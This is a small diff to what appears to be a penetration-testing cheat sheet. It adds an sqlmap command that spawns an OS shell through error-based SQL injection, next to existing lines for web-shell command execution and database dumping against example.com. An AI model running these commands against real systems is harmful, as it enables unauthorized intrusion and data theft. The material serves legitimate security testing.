@@ -191,6 +191,7 @@ curl http://www.example.com/shell.php?cmd=ls+-la
 
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
+sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
 
 # Debug errors
 sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
